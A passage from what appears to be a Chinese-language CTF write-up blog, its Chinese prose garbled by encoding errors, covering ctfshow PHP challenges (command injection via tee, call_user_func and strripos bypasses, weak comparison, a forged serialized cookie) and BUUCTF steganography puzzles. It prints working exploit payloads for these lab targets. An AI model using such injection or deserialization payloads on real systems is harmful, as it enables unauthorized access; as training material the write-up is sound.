class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>teeç”¨äºæ˜¾ç¤ºç¨‹åºçš„è¾“å‡ºå¹¶å°†å…¶å¤åˆ¶åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­<br>payload:<code>?c=ls |tee 1</code><br>è®¿é—®1æœ‰index.php æ²¡æœ‰flagæ–‡ä»¶<br>payload:<code>?c=ls / | tee 1</code><br>æ‰¾åˆ°flagæ–‡ä»¶f149_15_h3r3<br>payload:<code>?c=cat /f149_15_h3r3|tee 1</code><br>flagğŸ˜</p><h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs scss"><br><span class="hljs-built_in">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">highlight_file</span>(__FILE__);<br>class ctfshow<br>&#123;<br>    function <span class="hljs-built_in">__wakeup</span>()&#123;<br>        <span class="hljs-built_in">die</span>(&quot;private class&quot;);<br>    &#125;<br>    static function <span class="hljs-built_in">getFlag</span>()&#123;<br>        echo <span class="hljs-built_in">file_get_contents</span>(&quot;flag.php&quot;);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-built_in">call_user_func</span>($_POST[&#x27;ctfshow&#x27;]); <br></code></pre></td></tr></table></figure><p>æœ¬é¢˜è€ƒæŸ¥<a href="https://www.php.net/manual/zh/function.call-user-func.php">call_user_func()</a>çš„ä½¿ç”¨ï¼Œéœ€è¦è°ƒç”¨ctfshowç±»é‡Œçš„getFlagæ–¹æ³•<br><img src="/images/TONNBV45XFX45LF.png"><br>è°ƒç”¨æ–¹æ³•å¦‚å›¾æ‰€ç¤º<br>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">POST<br><span class="hljs-attribute">ctfshow</span>=ctfshow::getFlag<br></code></pre></td></tr></table></figure><h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">highlight_file</span>(__FILE__);<br>class ctfshow<br>&#123;<br>    function <span class="hljs-built_in">__wakeup</span>()&#123;<br>        <span class="hljs-built_in">die</span>(&quot;private class&quot;);<br>    &#125;<br>    static function <span class="hljs-built_in">getFlag</span>()&#123;<br>        echo <span class="hljs-built_in">file_get_contents</span>(&quot;flag.php&quot;);<br>    &#125;<br>&#125;<br><br><span class="hljs-built_in">if</span>(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-built_in">die</span>(&quot;private function&quot;);<br>&#125;<br><br><span class="hljs-built_in">call_user_func</span>($_POST[&#x27;ctfshow&#x27;]); <br></code></pre></td></tr></table></figure><p>strripos()å‡½æ•°å¯è¢«æ•°ç»„ç»•è¿‡<br>æ‰€ä»¥payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span><br><span class="hljs-attribute">ctfshow</span>[<span class="hljs-number">0</span>]=ctfshow&amp;ctfshow[<span class="hljs-number">1</span>]=getFlag<br></code></pre></td></tr></table></figure><h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f1</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f1&#x27;</span>];<br>    <span class="hljs-variable">$f2</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="hljs-variable">$f1</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="hljs-variable">$f2</span>))&#123;<br>            <span class="hljs-variable">$code</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$f1</span>(<span class="hljs-subst">$f2</span>());&quot;</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$code</span>) == <span class="hljs-string">&#x27;ctfshow&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>tip</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">var_dump(<span class="hljs-string">&#x27;a&#x27;</span> == <span class="hljs-number">0</span>);<span class="hljs-regexp">//</span>bool(true)<br>var_dump(<span class="hljs-string">&#x27;1a&#x27;</span> == <span class="hljs-number">1</span>);<span class="hljs-regexp">//</span>bool(true)<br>var_dump(<span class="hljs-string">&#x27;12a&#x27;</span> == <span class="hljs-number">1</span>);<span class="hljs-regexp">//</span>bool(false)<br></code></pre></td></tr></table></figure><ul><li><p>ä¼šå‡ºç°ä¸Šé¢çš„ç»“æœæ˜¯å› ä¸ºå­—ç¬¦ä¸²åœ¨å’Œæ•°å­—æ¯”è¾ƒçš„æ—¶å€™ä¼šå°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•°å­—ï¼Œæ¯”å¦‚aè½¬æ¢å¤±è´¥æˆFalseï¼ŒFalseåˆå’Œ0å¼±ç±»å‹æ¯”è¾ƒæ˜¯ç›¸ç­‰çš„ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªæ˜¯trueã€‚</p></li><li><p>ä½†æ˜¯å¦‚æœå­—ç¬¦ä¸²æ˜¯ä»¥æ•°å­—å¼€å¤´çš„ï¼Œé‚£ä¹ˆå°±ä¼šè½¬æˆè¿™ä¸ªæ•°å­—å†åšæ¯”è¾ƒï¼Œæ‰€ä»¥ç¬¬äºŒä¸ªä¹Ÿæ˜¯trueï¼Œç¬¬ä¸‰ä¸ªåˆ™æ˜¯å› ä¸ºè½¬æˆæ•°å­—åå˜æˆäº†12ï¼Œä¸ç­‰äº1ï¼Œåˆ™ä¸ºfalseã€‚</p></li></ul><p>æ‰€ä»¥æˆ‘ä»¬æ‹¼å‡‘å‡½æ•°ï¼Œå‡‘å‡ºç»“æœä¸º0æˆ–falseæˆ–NULLçš„ï¼Œéœ€è¦intval($code)çš„å€¼ä¸º0</p><p>paylaod:</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">f1=<span class="hljs-keyword">system</span>&amp;f2=<span class="hljs-keyword">system</span><br></code></pre></td></tr></table></figure><p><code>string system( string $command[, int &amp;$return_var] )</code><br>æˆåŠŸåˆ™è¿”å›å‘½ä»¤è¾“å‡ºçš„æœ€åä¸€è¡Œï¼Œå¤±è´¥åˆ™è¿”å› FALSE ã€‚system()å¿…é¡»åŒ…å«å‚æ•°ï¼Œå¤±è´¥è¿”å›FLASEï¼›system(â€˜FLASEâ€™)ï¼Œç©ºæŒ‡ä»¤ï¼Œå¤±è´¥è¿”å›FLASEã€‚</p><h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>))&#123;<br>        <span class="hljs-variable">$d</span> = (<span class="hljs-keyword">int</span>)(<span class="hljs-variable">$v1</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span>);<br>        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-variable">$d</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å…³é”®å‡½æ•°sleep(),sleep() å‡½æ•°å»¶è¿Ÿä»£ç æ‰§è¡Œè‹¥å¹²ç§’<br>è¾“å…¥v1ä¸ºæ•°å­—ï¼Œè‹¥v1ä¸º1éƒ½è¦å»¶è¿Ÿå¾ˆå¤šå¾ˆå¤šç§’ï¼Œé‚£ä¸å¦‚ç›´æ¥è®©v1&#x3D;0<br>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">v1</span>=0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>buuctf_misc</title>
    <link href="/2023/09/06/buuctf_misc/"/>
    <url>/2023/09/06/buuctf_misc/</url>
    
    <content type="html"><![CDATA[<h2 id="é‡‘ä¸‰èƒ–"><a href="#é‡‘ä¸‰èƒ–" class="headerlink" title="é‡‘ä¸‰èƒ–"></a>é‡‘ä¸‰èƒ–</h2><p>ä¸‹è½½ç»™çš„zipæ–‡ä»¶ï¼Œæ˜¯ä¸ªgifåŠ¨å›¾<br>ä½¿ç”¨stegsolveæ‰“å¼€</p><ul><li><p>File Format: æ–‡ä»¶æ ¼å¼ï¼Œè¿™ä¸ªä¸»è¦æ˜¯æŸ¥çœ‹å›¾ç‰‡çš„å…·ä½“ä¿¡æ¯ï¼Œç±»ä¼¼ä¸winhexçš„ç”¨æ³•</p></li><li><p>Data Extract: æ•°æ®æŠ½å–ï¼Œå›¾ç‰‡ä¸­éšè—æ•°æ®çš„æŠ½å–</p></li><li><p>Frame Browser: é€å¸§æµè§ˆï¼Œä¸»è¦æ˜¯å¯¹GIFä¹‹ç±»çš„åŠ¨å›¾è¿›è¡Œåˆ†è§£ï¼ŒåŠ¨å›¾å˜æˆä¸€å¼ å¼ å›¾ç‰‡ï¼Œä¾¿äºæŸ¥çœ‹</p></li><li><p>Image Combiner: æ‹¼å›¾ï¼Œå›¾ç‰‡æ‹¼æ¥</p></li></ul><p>ç”¨Frame browseråŠŸèƒ½ï¼Œé€å¸§æµè§ˆ<br><img src="/images/P28ZQ.png"></p><p><img src="/images/MOYOHGU.png"></p><p><img src="/images/ML6X.png"><br>æ‹¼æ¥flag{he11ohongke}</p><h2 id="ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°"><a href="#ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°" class="headerlink" title="ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°"></a>ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°</h2><p>ä¸‹è½½åä¸ºä¸€ä¸ªjpgå›¾ç‰‡<br>åŒæ ·ä½¿ç”¨stegsolveæ‰“å¼€<br>ä½¿ç”¨file formatåŠŸèƒ½<br>åœ¨asciiåŒºåŸŸæ‰¾åˆ°flag<br>flag{stego_is_s0_bo r1ing}</p><h2 id="äºŒç»´ç "><a href="#äºŒç»´ç " class="headerlink" title="äºŒç»´ç "></a>äºŒç»´ç </h2><p>è§£å‹zipæ–‡ä»¶å¾—åˆ°ä¸€ä¸ªpngçš„äºŒç»´ç å›¾ç‰‡<br>åˆ©ç”¨QR Researchå·¥å…·ï¼Œæ‰«æå¾—åˆ°äº†ä¸€ä¸ªä¸æ˜¯flagçš„ä¿¡æ¯ã€‚<br>ç”¨notepad++æ‰“å¼€<br><img src="/images/8V8.png"><br>å‘ç°æœ‰ä¸ªtxtæ–‡ä»¶<br>æŠŠåç¼€æ”¹ä¸ºzip<br>ç”¨winraræ‰“å¼€<br><img src="/images/J3AC7X.png"><br>è™½ç„¶æ‰¾åˆ°äº†ï¼Œä½†è¿™ä¸ªtxtæ–‡ä»¶éœ€è¦å¯†ç <br>ä½¿ç”¨zipå¯†ç ç ´è§£è½¯ä»¶ziperelloç ´è§£ï¼Œä½¿ç”¨æš´åŠ›ç ´è§£<br><img src="/images/HXIM8O.png"><br>å¾—åˆ°å¯†ç 7639ï¼Œæ‰“å¼€txtï¼Œå¾—åˆ°flag CTF{vjpw_wnoei}<br>æŠŠctfæ”¹ä¸ºflagå³å¯</p><h2 id="å¤§ç™½"><a href="#å¤§ç™½" class="headerlink" title="å¤§ç™½"></a>å¤§ç™½</h2><p>è§£å‹zipæ–‡ä»¶å¾—åˆ°ä¸€ä¸ªpngæ–‡ä»¶<br>å›¾ç‰‡åˆ†è¾¨ç‡ä¸º679*256</p><p>ç”¨notepad++æ‰“å¼€<br><img src="/images/GVVG5EN5.png"><br>ä¿®æ”¹ä¸€ä¸‹256éƒ¨åˆ†çš„å†…å®¹ï¼ŒæŠŠå®ƒä¿®æ”¹ä¸º679<br>16è¿›åˆ¶ä¸º02 a7ï¼Œä¿å­˜é‡æ–°è¿›å…¥å›¾ç‰‡<br>å‘ç°flag<br><img src="/images/DOQES57IFB.png"></p><h2 id="Nç§æ–¹æ³•è§£å†³"><a href="#Nç§æ–¹æ³•è§£å†³" class="headerlink" title="Nç§æ–¹æ³•è§£å†³"></a>Nç§æ–¹æ³•è§£å†³</h2><p>è§£å‹zipæ–‡ä»¶å¾—åˆ°ä¸€ä¸ªexeæ–‡ä»¶ï¼Œä½†æ˜¯æ‰“ä¸å¼€<br>ä½¿ç”¨notepad++æ‰“å¼€<br>å¾ˆé•¿çš„ä¸€ä¸²å­—ç¬¦<br><img src="/images/J962OCAJ.png"><br>å‘ç°ä¸base64å­—ç¬¦ä¸²è½¬æ¢å›¾ç‰‡æ ¼å¼ç›¸åŒ<br><img src="/images/JS8SMNKA5ZBU5DH9VIB.png"><br>è½¬æ¢å‡ºä¸€ä¸ªäºŒç»´ç <br>æ‰«æäºŒç»´ç å³å¯å¾—åˆ°flag</p><h2 id="ä¹Œé•‡å³°ä¼šç§å›¾"><a href="#ä¹Œé•‡å³°ä¼šç§å›¾" class="headerlink" title="ä¹Œé•‡å³°ä¼šç§å›¾"></a>ä¹Œé•‡å³°ä¼šç§å›¾</h2><p>ä¸‹è½½å›¾ç‰‡åä½¿ç”¨stegsolveæ‰“å¼€<br>åœ¨file formatä¸‹æŸ¥çœ‹ï¼Œå‘ç°flagåœ¨æœ€åº•ä¸‹<br><img src="/images/RKXJO.png"><br>æ³¨æ„è¦æŠŠflagä¸­çš„ç©ºæ ¼å–æ¶ˆ</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>webå…¥é—¨_ååºåˆ—åŒ–</title>
    <link href="/2023/08/05/fanxuliehua/"/>
    <url>/2023/08/05/fanxuliehua/</url>
    
    <content type="html"><![CDATA[<h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;isVip=<span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡ï¼Œé¦–å…ˆåˆå§‹ctfshowuserç±»ï¼Œåœ¨ç¬¬äºŒå±‚ifå½“ä¸­é¦–å…ˆæ‰§è¡Œloginæ–¹æ³•ï¼Œç”¨äºåˆ¤æ–­æˆ‘ä»¬getä¼ å…¥çš„å‚æ•°usernameå’Œpasswordæ˜¯å¦ä¸ç±»ä¸­ä¸€è‡´ï¼Œå‘ç°ç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯xxxxxxï¼Œæ‰€ä»¥payloadï¼š<code>?username=xxxxxx&amp;password=xxxxxx</code>å³å¯è·å–flag</p><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>é¦–å…ˆé€šè¿‡ååºåˆ—åŒ–è·å–å¯¹è±¡(åºåˆ—åŒ–å°†å¯¹è±¡ä¿å­˜åˆ°å­—ç¬¦ä¸²ï¼Œååºåˆ—åŒ–å°†å­—ç¬¦ä¸²æ¢å¤ä¸ºå¯¹è±¡)ï¼Œä¹‹å checkvipè¦æ±‚æ˜¯trueï¼Œä¹‹åæ‰§è¡Œvippnekeygetflagè·å–flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br>    <br></code></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?username<span class="hljs-operator">=</span>xxxxxx&amp;password<span class="hljs-operator">=</span>xxxxxx<br>Cookie: user<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>ctfShowUser<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>isVip<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bb<span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><h2 id="web256"><a href="#web256" class="headerlink" 